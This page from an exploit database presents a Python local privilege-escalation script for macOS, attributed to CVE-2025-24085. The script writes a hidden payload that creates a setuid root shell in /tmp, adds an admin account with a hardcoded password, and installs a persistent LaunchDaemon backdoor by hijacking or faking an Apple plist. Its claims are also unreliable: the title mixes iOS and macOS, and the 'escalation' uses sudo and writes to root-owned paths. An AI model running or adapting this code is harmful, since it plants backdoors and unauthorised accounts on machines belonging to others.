---
title: macOS LaunchDaemon iOS 17.2 Privilege Escalation
url: https://cxsecurity.com/issue/WLB-2025060025
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-06-27
fetch_date: 2025-10-06T22:47:54.509221
---

# macOS LaunchDaemon iOS 17.2 Privilege Escalation

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **macOS LaunchDaemon iOS 17.2 Privilege Escalation** **2025.06.26**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **[CVE-2025-24085](https://cxsecurity.com/cveshow/CVE-2025-24085/ "Click to see CVE-2025-24085")**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

#!/usr/bin/env python3
# Exploit Title: macOS LaunchDaemon iOS 17.2 - Privilege Escalation
# Author: Mohammed Idrees Banyamer (@banyamer\_security)
# GitHub: https://github.com/mbanyamer
# Date: 2025-05-31
# Tested on: macOS Sonoma (14.x ARM64 / x86\_64)
# CVE: CVE-2025-24085
# Type: Local Privilege Escalation
# Platform: macOS
# Author Country: Jordan
# Description:
# This local privilege escalation exploit leverages a vulnerable macOS LaunchDaemon plist configuration to execute
# arbitrary commands with root privileges. The exploit creates a root payload script that adds a root shell binary,
# creates an admin user, and installs a persistent LaunchDaemon backdoor for root access. It hijacks the
# com.apple.securemonitor LaunchDaemon plist to trigger the payload, allowing unauthorized escalation to root
# on macOS Sonoma systems.
import os
import plistlib
import time
from pathlib import Path
LAUNCHD\_PLIST = "/Library/LaunchDaemons/com.apple.securemonitor.plist"
PAYLOAD\_SCRIPT = "/tmp/.macroot\_payload.sh"
def create\_payload():
print("[+] Creating root payload script...")
payload = """#!/bin/bash
# Root shell
cp /bin/bash /tmp/.rootbash
chmod +s /tmp/.rootbash
chown root:wheel /tmp/.rootbash
# Add admin user
sysadminctl -addUser pentest -password macOS123! -admin
# Log file
echo "[+] Root backdoor triggered at $(date)" >> /tmp/.rootlog
# Persistent backdoor
cat <<EOF > /Library/LaunchDaemons/com.apple.backdoor.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key><string>com.apple.backdoor</string>
<key>ProgramArguments</key><array><string>/tmp/.rootbash</string></array>
<key>RunAtLoad</key><true/>
</dict>
</plist>
EOF
chmod 644 /Library/LaunchDaemons/com.apple.backdoor.plist
chown root:wheel /Library/LaunchDaemons/com.apple.backdoor.plist
"""
with open(PAYLOAD\_SCRIPT, "w") as f:
f.write(payload)
os.chmod(PAYLOAD\_SCRIPT, 0o755)
def hijack\_launchdaemon():
print("[+] Hijacking LaunchDaemon plist...")
if not Path(LAUNCHD\_PLIST).exists():
# create a fake one
print("[\*] Creating fake LaunchDaemon plist for exploitation...")
plist\_data = {
'Label': 'com.apple.securemonitor',
'ProgramArguments': [PAYLOAD\_SCRIPT],
'RunAtLoad': True,
}
with open(LAUNCHD\_PLIST, "wb") as f:
plistlib.dump(plist\_data, f)
else:
# hijack existing one
with open(LAUNCHD\_PLIST, 'rb') as f:
plist = plistlib.load(f)
plist['ProgramArguments'] = [PAYLOAD\_SCRIPT]
plist['RunAtLoad'] = True
with open(LAUNCHD\_PLIST, 'wb') as f:
plistlib.dump(plist, f)
os.system(f"chmod 644 {LAUNCHD\_PLIST}")
os.system(f"chown root:wheel {LAUNCHD\_PLIST}")
def trigger\_payload():
print("[+] Triggering LaunchDaemon manually...")
os.system(f"sudo launchctl load -w {LAUNCHD\_PLIST}")
print("[+] Done. You can now execute /tmp/.rootbash -p for root shell")
def main():
if os.geteuid() == 0:
print("[!] You are already root. No need to exploit.")
return
create\_payload()
hijack\_launchdaemon()
print("[+] Exploit completed. Reboot or run manually:")
print(f" sudo launchctl load -w {LAUNCHD\_PLIST}")
print(" Then run: /tmp/.rootbash -p")
if \_\_name\_\_ == "\_\_main\_\_":
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025060025)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top